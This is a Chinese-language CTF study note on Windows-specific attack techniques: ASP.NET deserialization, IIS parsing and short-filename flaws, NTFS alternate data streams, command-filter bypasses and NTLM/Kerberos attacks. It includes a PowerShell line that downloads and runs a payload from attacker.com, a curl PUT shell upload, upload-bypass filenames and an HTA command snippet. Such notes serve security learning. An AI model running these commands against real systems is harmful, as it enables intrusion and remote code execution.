# Windows 相关

## 概述

Windows 平台的安全特性（如 NTFS 文件系统、IIS 服务器、ASPX 运行时等）在 CTF 中衍生出独特的攻击面。这些攻击手法通常与 Linux 平台不通用，需要掌握 Windows 特有的文件系统特性、Web 服务器配置缺陷以及 ASP.NET 相关的漏洞。

## 常见攻击手法

### 1. ASPX 反序列化

- **ViewState 反序列化**：
  - ASP.NET ViewState 是服务端用于维护页面状态的一种机制，存储在隐藏字段 `__VIEWSTATE` 中
  - 若 ViewState 的 `EnableViewStateMac` 为 false 或 MachineKey 泄露，攻击者可构造恶意的 ViewState payload 实现反序列化 RCE
  - **利用工具**：`ysoserial.net` 的 `ViewState` 插件
  - **所需信息**：MachineKey（ValidationKey 和 DecryptionKey）

- **ObjectStateFormatter 反序列化**：
  - `ObjectStateFormatter.Serialize()` 和 `Deserialize()` 方法存在反序列化风险
  - 常见于 `SessionStateItemCollection` 和 `LosFormatter`

- **LosFormatter 反序列化**：
  - `LosFormatter` 是 ASP.NET 1.1 遗留下来的序列化格式，在某些遗留应用中仍有使用

- **SoapFormatter / BinaryFormatter 反序列化**：
  - 类似 Java 的反序列化，使用 `BinaryFormatter.Deserialize()` 处理用户输入时存在 RCE 风险

### 2. 文件通配符利用

Windows 命令处理文件通配符（Wildcard）的方式与 Linux 有重要差异，可用于绕过命令限制。

- **? 和 * 通配符**：在 Windows CMD 中，`?` 匹配单个字符，`*` 匹配任意字符
- **PowerShell 通配符**：`-like` 操作符支持 `*` 和 `?` 通配符匹配
- **文件通配符绕上传**：
  - 上传 `shell.asp;.jpg`（利用 IIS 的分号解析特性）
  - 利用 Windows 的文件名不区分大小写特性
- **利用通配符绕过过滤**：
  - 某些过滤规则只检查文件的扩展名，使用通配符可绕过检查
  - 示例：过滤 `.asp` 但允许 `.aspx`、`.ashx`、`.asmx`、`.asbx` 等

### 3. IIS 漏洞

- **IIS 短文件名泄露**：
  - Windows 为长文件名自动生成 8.3 格式短文件名（如 `FLAG~1.TXT`）
  - 利用通配符 `?` 逐字符猜测文件名
  - 工具：`iis_shortname_scanner`

- **IIS 解析漏洞**：
  - **IIS 6.0**：
    - `xx.asp;.jpg`：分号截断，解析为 ASP 文件
    - `xx.asp/`：目录解析，文件夹下所有文件作为 ASP 执行
    - `xx.asa`：ASA 文件也作为 ASP 执行
  - **IIS 7.0/7.5**：
    - `xx.jpg/.php`：FastCGI 解析漏洞（取决于 PHP 配置）

- **IIS PUT 漏洞**：
  - 若 IIS 启用了 WebDAV 且 PUT 方法允许，可直接上传文件
  - 使用 `curl -X PUT -d "payload" http://target.com/shell.txt` 上传

- **IIS TRACE 方法**：
  - 启用了 TRACE 方法时可能导致 Cross-Site Tracing（XST）攻击，反射 Cookie

### 4. NTFS 流绕过文件上传

NTFS 文件系统支持备用数据流（Alternate Data Streams，ADS），可用于绕过文件检查。

- **ADS 概念**：`file.txt:stream_name:$DATA`，一个文件可以关联多个数据流
- **绕过文件内容检查**：
  - 将恶意代码写入文件的主流，将合法内容写入 ADS
  - 或反过来：主流为图片头，ADS 为 PHP 代码
- **ADS 执行**：
  - PHP 执行 ADS：`php.exe shell.php:payload.txt`
  - `include 'shell.php:payload.txt'` 在某些配置下可执行 ADS 中的代码
- **ADS 隐藏数据**：利用 ADS 隐藏 flag 文件，需要通过 `dir /r` 才能看到 ADS 文件
- **ADS 检测**：`dir /r` 命令列出所有文件和 ADS

### 5. Windows 命令执行与绕过

- **PowerShell 命令执行**：
  - `powershell -c "command"`
  - 编码执行：`powershell -e <base64>`
  - 远程下载执行：`powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"`
- **CMD 特殊字符**：
  - `&`：顺序执行多条命令
  - `|`：管道传递输出
  - `||`：前一命令失败才执行后一命令
  - `&&`：前一命令成功才执行后一命令
  - `%PATH:~0,1%`：字符串截取，绕过字符过滤

### 6. Windows 认证绕过

- **NTLM 中继/哈希传递 (Pass-the-Hash)**：
  - 若应用依赖 NTLM 认证，获取 NTLM Hash 后可进行 PtH
- **Kerberos 票证 (Golden Ticket / Silver Ticket)**：
  - 伪造 Kerberos TGT 或 TGS 票证实现域管理员权限
- **Windows 集成认证绕过**：
  - 利用 `Negotiate` / `NTLM` 协议的自动登录行为

### 7. HTA 文件利用

HTA（HTML Application）是 Windows 特定的 Web 应用格式：

```html
<html>
<script>
  var c = new ActiveXObject('WScript.Shell');
  c.Run('cmd.exe /c whoami');
</script>
</html>
```

- HTA 文件以 `mshta.exe` 执行，拥有较高的权限
- 通过文件上传或 XSS 诱导下载执行 HTA 文件

## 相关工具

| 工具 | 用途 |
|------|------|
| ysoserial.net | .NET 反序列化 Payload 生成 |
| iis_shortname_scanner | IIS 短文件名扫描 |
| PowerSploit | PowerShell 渗透框架 |
| SharpHound | BloodHound 信息收集器 |

## 防御建议

- 禁用 IIS 的短文件名生成（`NtfsDisable8dot3NameCreation`）
- 升级 IIS 版本，避免解析漏洞
- 仔细检查用户上传的文件是否包含 ADS 数据流
- 使用安全配置（禁用 PUT、TRACE 等危险方法）

## CTF 中的常见考点

- IIS 短文件名泄露（`FLAG~1.TXT`）
- ASPX ViewState 反序列化 RCE
- NTFS ADS 隐藏文件或绕过上传检查
- IIS 6.0 分号截断解析漏洞

## 相关技能

- [文件上传](文件上传.md)
- [PHP](PHP.md)
- [逻辑漏洞](Web逻辑漏洞.md)
- [漏洞利用](../渗透测试/漏洞利用.md)
